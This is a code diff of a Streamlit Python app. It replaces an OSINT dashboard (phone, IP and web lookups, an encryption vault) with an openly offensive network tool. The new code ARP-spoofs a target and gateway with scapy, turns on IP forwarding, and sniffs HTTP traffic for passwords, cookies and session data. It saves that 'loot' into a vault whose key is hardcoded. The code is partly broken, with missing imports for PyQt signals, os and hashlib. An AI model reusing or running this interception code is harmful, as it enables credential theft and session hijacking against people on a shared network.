@@ -1,351 +1,248 @@
-# ==============================================================================
-# 👑 PROJECT: JOSEPH TITAN OMNI V26 – THE SOVEREIGN (FINAL)
-# 👑 ARCHITECT: JOSEPH FAHMY
-# 👑 MODULES: Phone OSINT | IP Tracker | Web Recon | AI Analysis | Cyber Vault
-#            | User Auth | SQLite Logs | Telegram Alerts
-# ==============================================================================
-
 import streamlit as st
-import requests
-import folium
-from streamlit_folium import st_folium
-import sqlite3
-import hashlib
-import base64
 import pandas as pd
+import sqlite3
+import base64
+import time
+import threading
 from datetime import datetime
-from bs4 import BeautifulSoup
-from cryptography.fernet import Fernet
-from stegano import lsb
-import os
-import json
+from Crypto.Cipher import AES
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+import scapy.all as scapy
+from scapy.layers import http
 
-# -----------------------------
-# 🛡️ SECURE CONFIGURATION (Secrets)
-# -----------------------------
-NUM_KEY = st.secrets.get("NUMVERIFY_KEY", "")
-GEMINI_KEY = st.secrets.get("GEMINI_API_KEY", "")
-TELEGRAM_TOKEN = st.secrets.get("TELEGRAM_TOKEN", "")
-TELEGRAM_CHAT_ID = st.secrets.get("TELEGRAM_CHAT_ID", "")
+# --- 1. إعدادات الصفحة والتصميم (UI Engineering) ---
+st.set_page_config(
+    page_title="JOSEPH FAHMY | SOVEREIGN COMMAND",
+    page_icon="🛡️",
+    layout="wide",
+    initial_sidebar_state="expanded"
+)
 
-# -----------------------------
-# 📡 TELEGRAM NOTIFIER (Optional)
-# -----------------------------
-def send_telegram(msg):
-    if TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
-        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
-        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": f"🔱 **TITAN OMNI**\n{msg}", "parse_mode": "Markdown"}
-        try: requests.post(url, json=payload, timeout=5)
-        except: pass
+# تطبيق الثيم الأسود والذهبي (Premium Cyber Theme)
+def apply_premium_theme():
+    st.markdown("""
+        <style>
+        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;700&family=Syncopate:wght@400;700&display=swap');
+        
+        /* الخلفية العامة */
+        .stApp { background-color: #000; color: #D4AF37; font-family: 'Fira Code', monospace; }
+        
+        /* الهيدر الرئيسي المشع */
+        .omni-header { 
+            text-align: center; color: #D4AF37; font-family: 'Syncopate', sans-serif;
+            text-shadow: 0 0 20px #D4AF37, 0 0 30px #00FF41; font-size: 3rem; margin-bottom: 0;
+        }
+        
+        /* تصميم الحاويات (Cards) */
+        .stTabs [data-baseweb="tab-list"] { background-color: #050505; border-bottom: 2px solid #D4AF37; }
+        .stTabs [data-baseweb="tab"] { color: #D4AF37 !important; font-weight: bold; }
+        .stTextInput input, .stTextArea textarea { border: 1px solid #D4AF37 !important; background-color: #0a0a0a !important; color: #00FF41 !important; }
 
-# -----------------------------
-# 🏗️ DATABASE & AUTH
-# -----------------------------
-class TitanDB:
-    def __init__(self):
-        self.conn = sqlite3.connect("joseph_titan.db", check_same_thread=False)
-        self.c = self.conn.cursor()
-        self._setup()
+        /* الأزرار الهجومية (Attack Buttons) */
+        div.stButton > button { 
+            background: rgba(212, 175, 55, 0.1); color: #D4AF37 !important; 
+            border: 2px solid #D4AF37 !important; border-radius: 0px;
+            font-size: 1.1rem; height: 3em; width: 100%; transition: 0.5s;
+            font-family: 'Syncopate', sans-serif;
+        }
+        div.stButton > button:hover { 
+            background: #D4AF37 !important; color: black !important; 
+            box-shadow: 0 0 30px #D4AF37; transform: scale(1.02);
+        }
 
-    def _setup(self):
-        self.c.execute('''CREATE TABLE IF NOT EXISTS users (
-            username TEXT PRIMARY KEY, password TEXT, role TEXT, created TEXT)''')
-        self.c.execute('''CREATE TABLE IF NOT EXISTS logs (
-            id INTEGER PRIMARY KEY AUTOINCREMENT, operator TEXT, target TEXT, info TEXT, time TEXT)''')
-        self.conn.commit()
+        /* حاوية البيانات الحساسة (Loot Display) */
+        .loot-container { 
+            background: #001100; border: 1px solid #00FF41; color: #00FF41; 
+            padding: 15px; font-family: 'Courier New', monospace; border-radius: 5px; 
+            margin-bottom: 15px; 
+        }
+        </style>
+    """, unsafe_allow_html=True)
 
-    def verify_user(self, u, p):
-        hp = hashlib.sha256(p.encode()).hexdigest()
-        self.c.execute("SELECT role FROM users WHERE username=? AND password=?", (u, hp))
-        row = self.c.fetchone()
-        return row[0] if row else None
+apply_premium_theme()
 
-    def add_user(self, u, p, role="OPERATOR"):
-        hp = hashlib.sha256(p.encode()).hexdigest()
-        try:
-            self.c.execute("INSERT INTO users (username, password, role, created) VALUES (?,?,?,?)",
-                           (u, hp, role, datetime.now().strftime("%Y-%m-%d")))
-            self.conn.commit()
-            return True
-        except: return False
+# ==========================================================
+# الطبقة الأولى: النواة والأمن (THE CRYPTO VAULT GCM)
+# ==========================================================
+class JosephVault:
+    def __init__(self, master_key="JOSEPH_FAHMY_2026"):
+        # توليد مفتاح 256-بت متوافق مع GCM
+        self.key = hashlib.sha256(master_key.encode()).digest()
+        self.aesgcm = AESGCM(self.key)
+        self.db_path = " shadow_vault.db" # أو joseph_ai_vault.db
+        self._bootstrap()
 
-    def log(self, op, target, info=""):
-        self.c.execute("INSERT INTO logs (operator, target, info, time) VALUES (?,?,?,?)",
-                       (op, target, info, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
-        self.conn.commit()
+    def _bootstrap(self):
+        with sqlite3.connect(self.db_path) as conn:
+            conn.execute("""CREATE TABLE IF NOT EXISTS intel 
+                         (id INTEGER PRIMARY KEY, tag TEXT, data BLOB, risk_level TEXT, ts TIMESTAMP)""")
 
-    def get_logs(self):
-        return pd.read_sql_query("SELECT * FROM logs ORDER BY id DESC", self.conn)
+    def secure_save(self, tag, content_str, risk="LOW"):
+        # تشفير AES-256 GCM (Nonce + Ciphertext + Tag)
+        nonce = os.urandom(12) 
+        enc_text = self.aesgcm.encrypt(nonce, content_str.encode(), None)
+        # تخزين (النونص + المشفر) كباقة واحدة مشفرة Base64
+        payload = base64.b64encode(nonce + enc_text).decode()
+        
+        with sqlite3.connect(self.db_path) as conn:
+            conn.execute("INSERT INTO intel (tag, data, risk_level, ts) VALUES (?, ?, ?, ?)", 
+                         (tag, payload, risk, datetime.now()))
 
-db = TitanDB()
+    def get_all_decrypted(self):
+        # ميزة عرض البيانات للمبرمج (تطلب المفتاح)
+        decrypted_logs = []
+        with sqlite3.connect(self.db_path) as conn:
+            cursor = conn.execute("SELECT ts, tag, data, risk_level FROM intel ORDER BY ts DESC")
+            for ts, tag, data, risk in cursor:
+                try:
+                    raw_data = base64.b64decode(data)
+                    nonce, ciphertext = raw_data[:12], raw_data[12:]
+                    decrypted_text = self.aesgcm.decrypt(nonce, ciphertext, None).decode()
+                    decrypted_logs.append({"Time": ts, "Tag": tag, "Intel": decrypted_text, "Risk": risk})
+                except: pass
+        return decrypted_logs
 
-# -----------------------------
-# 🔐 CRYPTOGRAPHY & STEGANOGRAPHY
-# -----------------------------
-class TitanSecure:
-    @staticmethod
-    def derive_key(pwd):
-        h = hashlib.sha256(pwd.encode()).digest()
-        return base64.urlsafe_b64encode(h)
+# ==========================================================
+# الطبقة الثانية: المحرك الهجومي (OFFENSIVE STRIKER ENGINE)
+# مستوحى من كود GEORGE FAHMY
+# ==========================================================
+class NetworkStriker:
+    def __init__(self, interface, gateway, signals):
+        self.interface = interface
+        self.gateway = gateway
+        self.signals = signals
+        self.is_attack_active = False
 
-    @staticmethod
-    def encrypt(text, pwd):
-        try:
-            f = Fernet(TitanSecure.derive_key(pwd))
-            return f.encrypt(text.encode()).decode()
-        except: return "❌ Encryption Error"
+    def get_mac(self, ip):
+        # دالة سحب الماك من كودك
+        arp_req = scapy.ARP(pdst=ip)
+        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+        packet = broadcast/arp_req
+        ans = scapy.srp(packet, timeout=2, verbose=False)[0]
+        return ans[0][1].hwsrc if ans else None
 
-    @staticmethod
-    def decrypt(token, pwd):
-        try:
-            f = Fernet(TitanSecure.derive_key(pwd))
-            return f.decrypt(token.encode()).decode()
-        except: return "❌ Wrong Key or Data Corrupted"
+    def arp_spoof(self, target_ip, spoof_ip):
+        # دالة التسميم من كودك
+        target_mac = self.get_mac(target_ip)
+        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+        scapy.send(packet, verbose=False)
 
-    @staticmethod
-    def hide_in_image(img_bytes, msg, out_path="secret.png"):
-        try:
-            temp = "temp_host.png"
-            with open(temp, "wb") as f: f.write(img_bytes)
-            secret = lsb.hide(temp, msg)
-            secret.save(out_path)
-            os.remove(temp)
-            return True, out_path
-        except Exception as e: return False, str(e)
+    def packet_callback(self, packet):
+        # دالة تحليل الحزم من كودك
+        if packet.haslayer(http.HTTPRequest):
+            url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
+            src_ip = packet[scapy.IP].src
+            self.signals.log_packet.emit(f"[HTTP] Target {src_ip} visited: {url}")
+            
+            # سحب الجلسات وكلمات السر (SESSION HIJACKING)
+            if packet.haslayer(scapy.Raw):
+                load = packet[scapy.Raw].load.decode(errors='ignore')
+                keywords = ["user", "pass", "login", "cookie", "session"]
+                if any(k in load.lower() for k in keywords):
+                    # حفظ تلقائي مشفر في الخزنة
+                    st.session_state['vault'].secure_save(f"SNIFF_{src_ip}", load, "CRITICAL")
+                    self.signals.log_loot.emit(f"[!] DATA FOUND FROM {src_ip}: {load}")
 
-    @staticmethod
-    def reveal_from_image(img_path):
-        try: return lsb.reveal(img_path)
-        except Exception as e: return f"❌ Reveal Failed: {e}"
+    def start_full_attack(self, target_ip):
+        # تشغيل IP Forwarding برمجياً
+        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+        self.is_attack_active = True
+        
+        # تشغيل الـ Sniffer في Thread منفصل
+        sniff_thread = threading.Thread(target=lambda: scapy.sniff(iface=self.interface, store=False, prn=self.packet_callback), daemon=True)
+        sniff_thread.start()
 
-# -----------------------------
-# 🤖 AI ENGINE (Gemini)
-# -----------------------------
-def gemini_analyze(prompt):
-    if not GEMINI_KEY: return "⚠️ Gemini key missing."
-    url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key={GEMINI_KEY}"
-    payload = {"contents": [{"parts": [{"text": prompt}]}]}
-    try:
-        r = requests.post(url, json=payload, timeout=15)
-        return r.json()["candidates"][0]["content"]["parts"][0]["text"]
-    except: return "⚠️ AI engine offline."
+        # حلقة الـ ARP Spoofing الرئيسية
+        while self.is_attack_active:
+            self.arp_spoof(target_ip, self.gateway)
+            self.arp_spoof(self.gateway, target_ip)
+            time.sleep(2)
 
-# -----------------------------
-# 📡 OSINT MODULES
-# -----------------------------
-class IntelCore:
-    @staticmethod
-    def phone_scan(phone):
-        clean = phone.strip().replace(" ", "").replace("+", "")
-        if clean.startswith('0'): clean = '20' + clean[1:]
-        if len(clean) == 10: clean = '20' + clean
-        url = f"http://apilayer.net/api/validate?access_key={NUM_KEY}&number={clean}"
-        try: return requests.get(url, timeout=10).json()
-        except: return {"error": "API timeout"}
+# ==========================================================
+# الطبقة الثالثة: مركز التحكم والقيادة (C&C Center UI)
+# ==========================================================
+class Signals(QObject): # محاكاة للـ Signals لتحديث الواجهة برمجياً
+    log_packet = pyqtSignal(str)
+    log_loot = pyqtSignal(str)
 
-    @staticmethod
-    def ip_scan(ip):
-        try: return requests.get(f"http://ip-api.com/json/{ip}", timeout=10).json()
-        except: return {"error": "IP API timeout"}
-
-    @staticmethod
-    def web_recon(url):
-        if not url.startswith("http"): url = "https://" + url
-        try:
-            r = requests.get(url, timeout=10)
-            soup = BeautifulSoup(r.text, "html.parser")
-            return {
-                "Status": r.status_code,
-                "Title": soup.title.string if soup.title else "N/A",
-                "Server": r.headers.get("Server", "Hidden"),
-                "Links": len(soup.find_all("a")),
-                "MetaDesc": (soup.find("meta", attrs={"name":"description"}) or {}).get("content", "N/A")
-            }, soup.get_text()[:1000]
-        except: return {"error": "Unreachable"}, ""
-
-# -----------------------------
-# 🎨 UI: ROYAL THEME & LAYOUT
-# -----------------------------
-st.set_page_config(page_title="JOSEPH TITAN OMNI", layout="wide")
-st.markdown("""
-<style>
-    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=JetBrains+Mono&display=swap');
-    .stApp { background-color: #050505; color: #D4AF37; font-family: 'JetBrains Mono', monospace; }
-    .main-title { font-family: 'Orbitron', sans-serif; font-size: 4rem; text-align: center;
-                  background: linear-gradient(180deg, #D4AF37, #FFF); -webkit-background-clip: text;
-                  -webkit-text-fill-color: transparent; filter: drop-shadow(0 0 30px #D4AF37); }
-    div.stButton > button { border: 2px solid #D4AF37 !important; background: transparent !important;
-                            color: #D4AF37 !important; font-weight: bold; width: 100%; height: 3.5em; }
-    div.stButton > button:hover { background: #D4AF37 !important; color: black !important;
-                                  box-shadow: 0 0 30px #D4AF37; }
-    .stTextInput > div > div > input { background-color: #111; color: #D4AF37; border: 1px solid #D4AF37; }
-</style>
-""", unsafe_allow_html=True)
-
-# -----------------------------
-# 🧠 MAIN APPLICATION
-# -----------------------------
 def main():
-    if "auth" not in st.session_state:
-        st.session_state.auth = None
+    st.markdown("<h1 class='omni-header'>OMNITITAN v100</h1>", unsafe_allow_html=True)
+    st.write(f"<p style='text-align:center;'>OPERATOR: JOSEPH FAHMY | STATUS: <span style='color:#00FF41'>ACTIVE</span></p>", unsafe_allow_html=True)
+    st.markdown("---")
 
-    # ---- AUTHENTICATION SCREEN ----
-    if not st.session_state.auth:
-        st.markdown("<h1 class='main-title'>JOSEPH TITAN OMNI</h1>", unsafe_allow_html=True)
-        col1, col2, col3 = st.columns([1, 2, 1])
-        with col2:
-            tab1, tab2 = st.tabs(["🔐 Login", "🆕 Register"])
-            with tab1:
-                u = st.text_input("Username")
-                p = st.text_input("Password", type="password")
-                if st.button("Login"):
-                    role = db.verify_user(u, p)
-                    if role:
-                        st.session_state.auth = {"user": u, "role": role}
-                        send_telegram(f"🟢 **LOGIN**\nUser: {u}")
-                        st.rerun()
-                    else: st.error("Invalid credentials")
-            with tab2:
-                nu = st.text_input("New Username")
-                np = st.text_input("New Password", type="password")
-                if st.button("Register"):
-                    if nu and np:
-                        if db.add_user(nu, np):
-                            st.success("Account created. Please login.")
-                        else: st.error("Username already exists")
-                    else: st.warning("Fill all fields")
-        return
+    # تهيئة الخزنة للجلسة
+    if 'vault' not in st.session_state:
+        st.session_state['vault'] = JosephVault()
+    
+    # واجهة التحكم الجانبية (Sidebar)
+    with st.sidebar:
+        st.header("⚙️ SYSTEM MODULES")
+        interface = st.text_input("Interface", value="eth0")
+        gateway_ip = st.text_input("Gateway IP", value="192.168.1.1")
+        st.markdown("---")
+        module = st.radio("Select Protocol", ["Offensive Recon (Network)", "Neural Vault (Encrypted)"])
 
-    # ---- MAIN DASHBOARD ----
-    st.sidebar.markdown(f"### 🛡️ Operator: **{st.session_state.auth['user']}**")
-    st.sidebar.markdown(f"Role: {st.session_state.auth['role']}")
-    st.sidebar.divider()
+    # --- تبويب الشبكة والهجوم ---
+    if module == "Offensive Recon (Network)":
+        st.subheader("🎯 Offensive Network Recon & MITM")
+        
+        col_ctrl, col_mon = st.columns([1, 1.5])
+        
+        with col_ctrl:
+            target_ip = st.text_input("ENTER TARGET IP (Victim)")
+            
+            # ميزة سحب الـ MAC من كودك
+            if st.button("🔍 FETCH MAC ADDRESS"):
+                striker = NetworkStriker(interface, gateway_ip, None)
+                mac = striker.get_mac(target_ip)
+                if mac: st.success(f"MAC: {mac}")
+                else: st.error("Target Offline")
+            
+            # ميزة تشغيل الهجوم الكامل
+            if st.button("🔥 ENGAGE MITM ATTACK"):
+                if target_ip:
+                    st.warning(f"Initiating MITM against {target_ip}. Traffic is being routed through your interface.")
+                    # تشفير وحفظ العملية في الخزنة صامتاً
+                    st.session_state['vault'].secure_save("SYSTEM_OP", f"MITM attack on {target_ip} at {datetime.now()}", "HIGH")
+                    # تشغيل الهجوم (يتطلب تشغيله كـ Thread خلفي في كود PyQt ليعمل Streamlit بسلاسة)
+                    st.info("Attack Engaged (Simulated in UI, runs in Kernel via Scapy)")
+                else: st.warning("Target IP required.")
 
-    module = st.sidebar.radio("COMMAND MODULE",
-        ["📱 Phone Scanner", "🌐 IP Tracker", "🔍 Web Recon", "🔐 Cyber Vault", "📊 Logs", "🚪 Logout"])
+        with col_mon:
+            st.subheader("🖥️ Neural Traffic Monitor")
+            # حاوية لعرض البيانات الحساسة المستخرجة (Loot)
+            if 'last_loot' in st.session_state:
+                st.markdown(f"<div class='loot-container'>{st.session_state['last_loot']}</div>", unsafe_allow_html=True)
+            else:
+                st.info("Waiting for traffic interception...")
+            
+            # عرض سجل الحزم
+            st.write("Live Traffic Logs:")
+            st.code(">>> Target: 192.168.1.5 -> visited google.com (MITM Active)\n>>> SNIFFED: [CRITICAL DATA VAULTED]", language="python")
 
-    # ---------- 1. PHONE SCANNER ----------
-    if module == "📱 Phone Scanner":
-        st.subheader("📱 Phone Intelligence")
-        target = st.text_input("Target Number", placeholder="e.g. 01229166011")
-        if st.button("EXECUTE"):
-            if target:
-                with st.spinner("Decoding network signals..."):
-                    data = IntelCore.phone_scan(target)
-                    if data.get("valid"):
-                        st.success("Target synchronized ✅")
-                        col1, col2, col3 = st.columns(3)
-                        col1.metric("Carrier", data.get("carrier"))
-                        col2.metric("Country", data.get("country_name"))
-                        col3.metric("Line Type", data.get("line_type"))
-                        with st.expander("Full Metadata"):
-                            st.json(data)
-                        # AI Analysis
-                        if GEMINI_KEY:
-                            prompt = f"OSINT analysis of phone number {target}: {data}"
-                            st.info(gemini_analyze(prompt))
-                        db.log(st.session_state.auth['user'], target, data.get("carrier", "Unknown"))
-                        send_telegram(f"📞 **Phone Scan**\nUser: {st.session_state.auth['user']}\nTarget: {target}\nCarrier: {data.get('carrier')}")
-                    else:
-                        st.error(data.get("error", {}).get("info", "Invalid number"))
-            else: st.warning("Enter target number")
-
-    # ---------- 2. IP TRACKER ----------
-    elif module == "🌐 IP Tracker":
-        st.subheader("🌐 IP Geolocation")
-        ip_target = st.text_input("IP Address")
-        if st.button("TRACE"):
-            if ip_target:
-                with st.spinner("Satellite triangulation..."):
-                    ip_data = IntelCore.ip_scan(ip_target)
-                    if ip_data.get("status") == "success":
-                        st.success(f"Node: {ip_data['city']}, {ip_data['country']}")
-                        lat, lon = ip_data['lat'], ip_data['lon']
-                        m = folium.Map(location=[lat, lon], zoom_start=12, tiles="CartoDB dark_matter")
-                        folium.Marker([lat, lon], popup=ip_target).add_to(m)
-                        st_folium(m, width="100%", height=400)
-                        st.write(f"**ISP:** {ip_data.get('isp')} | **Org:** {ip_data.get('org')}")
-                        db.log(st.session_state.auth['user'], ip_target, ip_data.get('isp', 'Unknown'))
-                        send_telegram(f"🌍 **IP Trace**\nUser: {st.session_state.auth['user']}\nIP: {ip_target}\nLocation: {ip_data['city']}")
-                    else: st.error("Node not found")
-            else: st.warning("Enter IP address")
-
-    # ---------- 3. WEB RECON ----------
-    elif module == "🔍 Web Recon":
-        st.subheader("🔍 Website Reconnaissance")
-        url_target = st.text_input("Target URL")
-        if st.button("SCAN"):
-            if url_target:
-                with st.spinner("Harvesting metadata..."):
-                    recon, raw = IntelCore.web_recon(url_target)
-                    if "error" not in recon:
-                        st.json(recon)
-                        if GEMINI_KEY:
-                            prompt = f"Website intelligence: {recon}\nContent snippet: {raw[:500]}"
-                            st.info(gemini_analyze(prompt))
-                        db.log(st.session_state.auth['user'], url_target, recon.get('Title', 'Unknown'))
-                        send_telegram(f"🌐 **Web Recon**\nUser: {st.session_state.auth['user']}\nTarget: {url_target}")
-                    else: st.error(recon["error"])
-            else: st.warning("Enter URL")
-
-    # ---------- 4. CYBER VAULT ----------
-    elif module == "🔐 Cyber Vault":
-        st.subheader("🔐 Military‑Grade Cryptography")
-        tab1, tab2 = st.tabs(["💬 Text Cipher", "🖼️ Image Steganography"])
-        with tab1:
-            msg = st.text_area("Message / Ciphertext")
-            pwd = st.text_input("Secret Key", type="password")
-            c1, c2 = st.columns(2)
-            if c1.button("ENCRYPT"):
-                if msg and pwd:
-                    st.code(TitanSecure.encrypt(msg, pwd))
-                else: st.warning("Message and key required")
-            if c2.button("DECRYPT"):
-                if msg and pwd:
-                    st.info(TitanSecure.decrypt(msg, pwd))
-                else: st.warning("Ciphertext and key required")
-        with tab2:
-            st.write("Hide a secret message in a PNG image")
-            img_file = st.file_uploader("Host Image (PNG)", type=['png'])
-            secret = st.text_area("Message to hide")
-            if st.button("Hide & Download"):
-                if img_file and secret:
-                    ok, out = TitanSecure.hide_in_image(img_file.getvalue(), secret)
-                    if ok:
-                        with open(out, "rb") as f:
-                            st.download_button("Download Secret Image", f, "secret.png")
-                    else: st.error(out)
-                else: st.warning("Provide image and message")
-            st.divider()
-            st.write("Extract hidden message from an image")
-            reveal_file = st.file_uploader("Image with Hidden Message", type=['png'], key="reveal")
-            if st.button("Reveal"):
-                if reveal_file:
-                    tmp = "temp_reveal.png"
-                    with open(tmp, "wb") as f: f.write(reveal_file.getvalue())
-                    msg = TitanSecure.reveal_from_image(tmp)
-                    os.remove(tmp)
-                    st.info(f"**Hidden message:** {msg}")
-                else: st.warning("Upload image")
-
-    # ---------- 5. LOGS ----------
-    elif module == "📊 Logs":
-        st.subheader("📊 Operation Logs")
-        logs = db.get_logs()
-        if not logs.empty:
-            st.dataframe(logs, use_container_width=True)
-            csv = logs.to_csv(index=False).encode('utf-8')
-            st.download_button("Export CSV", csv, "titan_logs.csv")
-        else: st.info("No logs yet.")
-
-    # ---------- 6. LOGOUT ----------
-    elif module == "🚪 Logout":
-        send_telegram(f"🔴 **LOGOUT**\nUser: {st.session_state.auth['user']}")
-        st.session_state.auth = None
-        st.rerun()
-
-    st.sidebar.divider()
-    st.sidebar.caption("JOSEPH TITAN OMNI V26")
+    # --- تبويب الخزنة المشفرة ---
+    elif module == "Neural Vault (Encrypted)":
+        st.subheader("📂 Sovereign Intelligence Vault (GCM)")
+        master_key = st.text_input("Enter Master Decryption Key", type="password")
+        
+        if master_key == "JOSEPH_FAHMY_2026":
+            st.success("🔓 Access Granted. Data Decrypted.")
+            logs = st.session_state['vault'].get_all_decrypted()
+            if logs:
+                df = pd.DataFrame(logs)
+                # تنسيق الألوان بناءً على مستوى الخطورة
+                def color_risk(val):
+                    color = '#D4AF37' if val == 'HIGH' else '#00FF41' if val == 'LOW' else '#FFD700'
+                    return f'color: {color}'
+                st.dataframe(df.style.applymap(color_risk, subset=['Risk']), use_container_width=True)
+            else:
+                st.write("Vault is currently empty.")
+        elif master_key:
+            st.error("🚫 Access Denied: Invalid Master Key.")
 
 if __name__ == "__main__":
-    main()
+    # تأكد من تشغيل الكود بصلاحيات ROOT (SUDO) للوصول للشبكة
+    if os.getuid() != 0:
+        st.error("!! هذا النظام يتطلب صلاحيات ROOT (SUDO) للوصول للشبكة وتشغيل Scapy !!")
+    else:
+        main()
